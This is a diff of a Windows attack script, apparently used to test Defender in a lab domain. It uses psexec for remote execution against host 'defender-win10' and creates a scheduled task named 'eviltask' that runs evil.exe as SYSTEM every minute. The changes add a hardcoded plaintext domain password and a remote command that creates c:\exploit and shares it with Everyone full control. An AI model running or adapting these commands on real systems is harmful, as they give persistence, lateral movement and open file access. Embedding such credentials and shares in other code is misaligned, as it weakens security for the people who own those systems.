@@ -16,8 +16,8 @@ c:\exploit\pstools\psexec.exe \\defender-win10 powershell -command "c:\exploit\m
 schtasks /create /sc minute /mo 1 /tn "eviltask" /tr c:\exploit\evil.exe /ru "SYSTEM" /s defender-win10
 
 
-
-$u = "sec.content\danny"
-$sp= ConvertTo-SecureString -String $p -AsPlainText -Force
-$c = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $u, $sp
-Start-Process -FilePath cmd.exe -Credential $c -ArgumentList "/c psexec.exe \\defender-win10 cmd.exe /c 'echo 3 '"
+$password = 'Cato2023!'
+$user = "sec.content\danny"
+$securepassword= ConvertTo-SecureString -String $password -AsPlainText -Force
+$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securepassword
+Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\defender-win10 cmd.exe /c 'mkdir c:\exploit &net share ShareName=c:\exploit /grant:Everyone,FULL '"
